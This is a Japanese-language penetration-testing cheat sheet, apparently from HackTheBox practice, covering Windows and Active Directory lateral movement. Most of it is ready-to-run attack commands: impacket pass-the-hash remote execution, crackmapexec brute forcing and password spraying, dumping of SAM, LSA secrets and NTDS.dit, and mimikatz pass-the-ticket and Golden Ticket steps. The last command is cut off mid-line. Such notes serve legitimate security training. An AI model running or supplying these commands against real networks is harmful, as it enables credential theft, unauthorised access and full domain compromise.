## 目次

1. [psexec - smbexec - wmiexec - atexec](#psexec---smbexec---wmiexec---atexec)
    - [psexec](#psexec)
    - [smbexec](#smbexec)
    - [wmiexec](#wmiexec)
    - [atexec](#atexec)
2. [winrs](#winrs)
3. [crackmapexec](#crackmapexec)
    - [crackmapexec 基本コマンド](#crackmapexec-基本コマンド)
    - [crackmapexec モジュール](#crackmapexec-モジュール)
4. [Pass the ticket](#pass-the-ticket)
5. [Golden Ticket](#golden-ticket)

## psexec - smbexec - wmiexec - atexec

ここでは、主に資格情報やハッシュを用いてリモートでコマンドを実行するためのツールについて説明します。

### psexec

`psexec`は、管理者権限を持つユーザーがリモートシステムでコマンドを実行できるツールです。

```bash
psexec.py <domain>/<user>:<password1>@<IP>
```

ユーザーはリモートシステムの管理共有（例：C$）への書き込みアクセス権を持っている必要があり、その後、セッションを取得できます。

#### ハッシュ使用例

パスワードの代わりにNTLMハッシュを使用する場合、以下のようにコマンドを実行します。

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
```

他にも、以下のように実行できます。

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@jeeves.htb cmd.exe
```

### smbexec

`smbexec`は、`psexec`に似ていますが、リモートでコマンドを実行する際にSMB（Server Message Block）プロトコルを使用します。

```bash
smbexec.py <domain>/<user>:<password1>@<IP>
```

また、以下のようにハッシュを使用することもできます。

```bash
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
```

### wmiexec

`wmiexec`は、Windows Management Instrumentation（WMI）を使用してリモートシステムでコマンドを実行するツールです。

```bash
wmiexec.py <domain>/<user>:<password1>@<IP>
```

ハッシュを使用する場合は、以下のように実行します。

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
```

### atexec

`atexec`は、Windowsのタスクスケジューラを利用してコマンドをリモート実行するツールです。ハッシュを使用して実行する場合は、以下のコマンドを使います。

```bash
atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
```

---

## winrs

`winrs`は、Windows Remote Shellを使用してリモートシステムでコマンドを実行するためのツールです。以下のコマンドで、ユーザーがシステムにアクセス可能か確認し、その後リバースシェルを実行できます。

```bash
winrs -r:<computername> -u:<user> -p:<password> "command"
```

このコマンドは、Windowsセッション内で実行します。

---

## crackmapexec

`crackmapexec`は、ネットワーク上の複数のホストに対して様々な攻撃を自動化するためのツールです。

### crackmapexec 基本コマンド

以下は、`crackmapexec`の基本的な使用例です。

```bash
crackmapexec smb jeeves.htb -u Administrator -p passwords
```

`crackmapexec`は、`smb`, `winrm`, `mssql`, `ldap`, `ftp`, `ssh`, `rdp`などのサービスに対して利用可能です。次に、SMBサービスに対してブルートフォース攻撃を行うコマンド例を示します。

```bash
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # "Pwned"と表示されます
```

以下は、SMBに対するパスワードスプレー攻撃の例です。

```bash
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success
```

その他の有用なコマンド例：

```bash
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares # 共有フォルダのリストを表示
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks # ディスク情報の取得
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users # DCのユーザー情報を取得
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions # アクティブセッションの確認
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol # パスワードポリシーの取得
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam # SAMハッシュの取得
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa # LSAシークレットのダンプ
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds # NTDS.ditファイルのダンプ
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} # 特定のグループに属するユーザーの列挙
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' # コマンドの実行, "-x"はcmd, "-X"はpowershellコマンド用
```

### crackmapexec モジュール

`crackmapexec`には、様々なモジュールがあります。以下は、モジュールに関するコマンド例です。

```bash
crackmapexec smb -L # モジュールのリストを表示
crackmapexec smb -M mimikatx --options # モジュールの必要なオプションを表示
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz # デフォルトコマンドの実行
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' # 特定のコマンドを実行
```

---

## Pass the ticket

`Pass the ticket`攻撃は、Mimikatzを用いてKerberosチケットを取得し、それを他のシステムで使用する攻撃です。

```bash
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

---

## Golden Ticket

`Golden Ticket`は、ドメインコントローラ上の`krbtgt`アカウントの秘密情報を使用して、任意のユーザーとして認証を行う攻撃です。

```bash
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:
```
